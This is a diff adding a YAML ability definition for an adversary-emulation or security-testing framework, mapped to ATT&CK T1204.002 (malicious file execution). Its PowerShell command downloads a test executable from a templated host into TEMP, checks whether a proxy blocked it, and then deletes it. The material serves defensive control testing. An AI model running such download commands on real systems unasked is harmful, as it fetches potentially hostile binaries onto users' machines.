@@ -1,0 +1,42 @@
+- tactic: execution
+  technique_name: 'User Execution: Malicious File'
+  technique_id: T1204.002
+  name: 'Malware: CSA - Potentially Unwanted File'
+  description: Adversaries often rely on users opening malicious files to gain code
+    execution, typically through social engineering techniques. These files, which
+    can include .doc, .pdf, .xls, .exe, and others, may be disguised with familiar
+    names or password protection to trick users into executing them. This behavior
+    is commonly seen after initial access or internal spearphishing, where the malicious
+    file is placed in accessible locations like shared directories or desktops. The
+    goal is to manipulate users into executing the file, allowing the adversary to
+    execute their payload.
+  executors:
+  - name: psh
+    platform: windows
+    command: "$response = Invoke-WebRequest #{ignite.url}/malware/PotentiallyUnwanted.exe\
+      \ -ErrorAction Stop;\n\nif ($response.Headers[\"Content-Type\"] -like \"text/html*\"\
+      ) {\n    throw \"Blocked by proxy \u2014 received HTML instead of native error.\"\
+      \n};\n$response.Content | Set-Content \"$env:TEMP\\PotentiallyUnwanted.exe\"\
+      ;\nStart-Sleep -Seconds 3;\nRemove-Item \"$env:TEMP\\PotentiallyUnwanted.exe\"\
+      \ -Force"
+    code: null
+    language: null
+    build_target: null
+    payloads: []
+    uploads: []
+    timeout: 10
+    parsers: []
+    cleanup: []
+    variations: []
+    additional_info: {}
+  requirements: []
+  privilege: ''
+  repeatable: false
+  buckets:
+  - execution
+  additional_info: {}
+  access: {}
+  singleton: true
+  plugin: ''
+  delete_payload: true
+  id: 8b8d19c7-bf54-4d05-81c2-968d11fa231d
